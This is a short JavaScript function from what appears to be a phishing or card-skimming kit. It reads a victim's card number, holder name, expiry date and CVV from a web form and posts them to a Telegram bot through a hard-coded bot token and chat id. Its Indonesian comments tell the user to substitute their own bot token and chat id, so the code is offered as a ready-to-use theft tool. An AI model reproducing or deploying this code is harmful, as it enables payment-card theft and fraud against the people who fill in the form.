function kirimPes() {

    var cardnu = document.getElementById('cardnu');
    var holder = document.getElementById('holder');
    var month = document.getElementById('month');
    var year = document.getElementById('year');
    var pesan = document.getElementById('pesan');

    var gabungan = 'ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot%0A%0ACard Number : ' + cardnu.value + '%0AHolder : ' + holder.value  + '%0AMonth : ' + month.value  + '%0AYear : ' + year.value + '%0ACVV : ' + cvv.value;

    var token = '6580655277:AAHYm3Y5tO3dHgAEwPq9nuI1l0xW5LJx60Y'; // Ganti dengan token bot yang kamu buat
    var grup = '6410517472'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}
